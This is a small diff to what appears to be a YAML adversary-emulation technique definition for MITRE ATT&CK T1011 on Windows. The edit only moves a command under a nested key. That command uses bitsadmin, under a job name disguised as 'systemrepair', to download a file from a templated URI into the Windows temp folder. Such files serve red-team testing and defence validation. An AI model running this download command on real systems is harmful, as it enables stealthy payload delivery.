@@ -8,7 +8,8 @@ mitre_technique:
   id: T1011
   platform: Windows
 commands:
-- input: bitsadmin /transfer systemrepair /download /priority normal {{ persistence_download_uri}}
-    c:\windows\temp\file.txt
+- input:
+    command: bitsadmin /transfer systemrepair /download /priority normal {{ persistence_download_uri}}
+      c:\windows\temp\file.txt
   sleep: 1
   module: exec_shell
